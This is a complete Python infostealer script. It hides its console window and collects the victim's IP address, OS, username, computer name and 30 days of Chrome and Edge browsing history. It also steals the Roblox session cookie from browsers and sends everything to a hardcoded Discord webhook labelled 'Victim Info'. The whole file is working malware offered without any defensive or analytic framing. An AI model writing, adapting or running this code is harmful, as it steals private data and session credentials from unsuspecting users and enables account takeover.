WEBHOOK = "https://discord.com/api/webhooks/1445845711915716769/Z1lEpmgJRFEsnw4tGKLgxOpZtnWNIX51s-16jqw6J9xqr2yK8vbzj74S6IowFKih8sWc"

def send_embed(title, fields):
    embed = Embed(title=title, color=0x00ff00, timestamp=datetime.utcnow())
    for name, value in fields.items():
        embed.add_field(name=name, value=value[:1020], inline=True if len(name) < 15 else False)
    SyncWebhook.from_url(WEBHOOK).send(embed=embed, username="Victim Info")

def get_ip():
    return requests.get("https://api.ipify.org").text

def get_search_history():
    history = []
    try:
        from browser_history.browsers import Chrome, Edge
        for browser in [Chrome, Edge]:
            try:
                outputs = browser().fetch_history()
                for h in outputs.histories:
                    if h[0] > datetime.now() - timedelta(days=30):
                        history.append(f"{h[0].strftime('%Y-%m-%d %H:%M')} | {h[1]}")
            except: pass
    except: pass
    return "\n".join(history[:100]) or "No recent history"

def main():
    hide_console = lambda: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    hide_console()

    fields = {
        "IP Address": get_ip(),
        "OS": f"{platform.system()} {platform.release()} ({platform.machine()})",
        "Windows Username": os.getenv("USERNAME"),
        "Computer Name": os.getenv("COMPUTERNAME"),
        "Battery Level": f"{round(requests.get('http://localhost:8080/battery').json()['level'] * 100)}%" if os.name == "nt" else "Unknown",
        "Roblox Profile": "Not logged in",
        "Last 30 Days Google Searches": get_search_history()
    }

    # Try to get Roblox username from cookie
    try:
        import browser_cookie3
        for b in [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge]:
            try:
                cookies = b(domain_name=".roblox.com")
                for c in cookies:
                    if c.name == ".ROBLOSECURITY":
                        r = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": c.value})
                        if r.status_code == 200:
                            data = r.json()
                            fields["Roblox Profile"] = f"[{data['name']}](https://roblox.com/users/{data['id']}/profile)"
            except: pass
    except: pass

    send_embed("💀 NEW VICTIM FULLY EXPOSED", fields)
    print("All data sent. Victim owned.")

if __name__ == "__main__":
    main()